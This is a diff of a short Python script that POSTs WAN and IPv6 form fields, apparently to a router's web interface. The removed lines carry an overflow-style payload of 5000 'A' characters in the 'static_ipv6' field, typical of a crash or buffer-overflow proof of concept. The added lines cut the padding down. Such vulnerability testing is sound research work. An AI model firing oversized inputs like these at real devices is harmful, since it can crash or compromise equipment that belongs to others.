@@ -35,8 +35,8 @@ headers = {
 	"Priority": "u=4",
 }
 
-repeated = "A"*5000
-data = "wan_enable=1&OriginType=1&enable_dhcpv6RapidCommit=1&static_ipv6={}".format (repeated)
+repeated = "A"
+data = "wan_enable=1&OriginType=1&enable_dhcpv6RapidCommit=1{}".format (repeated)
 
 response = requests.post (url, data=data, headers=headers,verify=False)
 #print(response.text)
